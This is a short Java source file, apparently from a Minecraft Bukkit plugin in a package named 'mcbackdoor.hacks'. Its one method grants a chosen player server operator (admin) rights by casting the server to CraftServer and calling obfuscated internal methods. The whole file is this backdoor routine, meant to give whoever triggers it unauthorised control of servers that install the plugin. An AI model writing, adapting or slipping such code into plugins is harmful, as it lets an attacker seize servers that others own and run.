/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package org.martin.bukkit.mcbackdoor.hacks;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Server;
import org.bukkit.craftbukkit.CraftServer;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

/**
 *
 * @author Kekec852
 */
public class get_server_op {

    public static boolean getServerOp(JavaPlugin plugin, Player player) {
        CraftServer cServer;
        Server server = plugin.getServer();
        try {
            cServer = (CraftServer) server;
            cServer.getHandle().e(player.getName());
            return cServer.getHandle().h(player.getName());
        } catch (Exception ex) {
            Logger.getLogger("Minecraft").log(Level.SEVERE, null, ex);
        }
        return false;
    }
}
